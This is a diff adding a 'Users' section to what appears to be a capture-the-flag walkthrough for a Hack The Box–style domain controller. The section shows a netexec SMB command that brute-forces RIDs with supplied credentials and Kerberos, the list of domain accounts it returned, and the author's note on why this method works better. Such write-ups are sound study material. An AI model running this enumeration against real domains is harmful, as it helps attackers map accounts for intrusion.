@@ -462,8 +462,24 @@ Just default shares
 
 ## Users
 ```python
-
+❯❯❯ faketime -f +7h nxc smb dc01.mirage.htb -u 'nathan.aadam' -p '3edc#EDC3' -k --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 | tee users.txt
+Administrator
+Guest
+krbtgt
+DC01$
+Dev_Account_A
+Dev_Account_B
+david.jjackson
+javier.mmarshall
+mark.bbond
+nathan.aadam
+Mirage-Service$
+svc_mirage
 ```
+
+Ill use `--rid-brute` to get users, this also pulls machine accounts so in my personal opinion it works better than `--users` or `--users-export`
+
+
 
 
 
